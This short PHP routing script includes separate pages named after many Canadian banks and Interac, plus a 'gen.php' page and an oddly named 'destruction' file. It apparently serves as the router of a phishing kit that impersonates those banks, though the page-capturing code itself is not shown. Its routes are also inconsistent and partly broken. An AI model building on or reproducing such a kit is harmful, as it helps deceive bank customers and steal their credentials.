


<?php


$uri = $_SERVER['REQUEST_URI'];

switch ($uri) {
    case "/rbc":
        require_once ("rbc");
        break;
    case "/gen":
        require_once ("gen.php");
        break;
    case "tdd":
        require_once ("/tdd");
        break;

    case "rbc":
        require_once ("/rbc");
        break;

    case "scotia":
        require_once ("/scotia");
        break;

    case "bmo":
        require_once ("/bmo");
        break;


    case "bnc":
        require_once ("/bnc");
        break;

    case "cbic":
        require_once ("/cbic");
        break;

    case "desjardin":
        require_once ("/desjardin");
        break;

    case "laurentienne":
        require_once ("/laurentienne");
        break;

    case "meridian":
        require_once ("/meridian");
        break;

    case "people":
        require_once "people";
        break;

    case "financial":
        require_once ("/financial");
        break;

    case "destruction":
        require_once ("/blinky2000@bvc@bvc@destruction.txt");
        break;
     case "interac":
            require_once ("interac.php");
            break;




}

